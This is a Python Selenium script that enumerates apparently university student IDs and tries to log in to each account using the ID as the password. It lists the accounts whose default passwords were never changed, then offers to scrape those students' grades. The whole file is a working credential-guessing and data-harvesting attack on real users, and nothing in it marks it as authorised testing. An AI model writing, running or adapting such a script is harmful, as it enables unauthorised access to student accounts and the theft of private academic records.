from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from myhelpers import login, get_grades
from student_def import Student
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.action_chains import ActionChains


# dyyykkknn where d is degree, yyy is year, kkk is dept, nn is student number within dept, year and degree
candidates = []
degrees = ['4']

for degree in degrees:
    for year in range(110, 103, -1):
        for dep in range(212, 214):
            for number in range(1, 100):
                new_stud = degree + str(year)
                dept = str(dep)
                dept = f'{dept: >3}'.format('0').replace(' ', '0')
                num = str(number)
                num = f'{num: >2}'.format('0').replace(' ', '0')
                new_stud += dept
                new_stud += num
                candidates.append(new_stud)
                # print(new_stud)

# input()
unchanged = []
for cand in candidates:
    driver = login(cand, cand, 'firefox')

    if driver is None:
        print(f'User {cand} could not login with password {cand}.')
    else:
        print(f'User {cand} has not changed their password.')
        unchanged.append(cand)
        # get_grades(driver, cand, cand)

print('Results: ')
print("List of users who haven't changed their passwords.")
print(unchanged)
print()

print("Would you like to continue to get their grades as well? (Press any key to continue)")
input()
print("Are you sure? (Press any key to continue.)")
input()

for user in unchanged:
    driver = login(user, user)
    print(f"Getting user {user} grades now.")
    get_grades(driver, cand, cand)
